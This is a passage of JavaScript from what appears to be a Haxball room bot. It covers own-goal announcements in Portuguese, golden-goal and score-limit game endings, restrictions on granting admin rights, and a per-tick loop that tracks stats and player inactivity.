	else {
		room.sendChat("😂 " + getTime(scores) + " Gol contra de " + lastPlayersTouched[0].name + "! Velocidade do gol: " + ballSpeed.toPrecision(4).toString() + "km/h " + (team == Team.RED ? "🔴" : "🔵"));
		game.goals.push(new Goal(scores.time, team, null, null));
	}
	if (scores.scoreLimit != 0 && (scores.red == scores.scoreLimit || scores.blue == scores.scoreLimit && scores.blue > 0 || goldenGoal == true)) {
		endGame(team);
		goldenGoal = false;
		setTimeout(() => { room.stopGame(); }, 1000);
	}
}

room.onPositionsReset = function() {
	countAFK = true;
	lastPlayersTouched = [null, null];
}

/* MISCELLANEOUS */

room.onRoomLink = function(url) {
    randomizeUniforms();
}

room.onPlayerAdminChange = function (changedPlayer, byPlayer) {
	if (getMute(changedPlayer) && changedPlayer.admin) {
		room.sendChat(changedPlayer.name + " foi desmutado.");
		setMute(changedPlayer, false);
	}
	if (byPlayer.id != 0 && localStorage.getItem(getAuth(byPlayer)) && JSON.parse(localStorage.getItem(getAuth(byPlayer)))[Ss.RL] == "admin") {
		room.sendChat("Você não tem permissão para nomear um jogador como admin!", byPlayer.id);
		room.setPlayerAdmin(changedPlayer.id, false);
	}
}

room.onStadiumChange = function(newStadiumName, byPlayer) {
}

room.onGameTick = function() {
	checkTime();
	getLastTouchOfTheBall();
	getStats();
	handleInactivity();
}

}
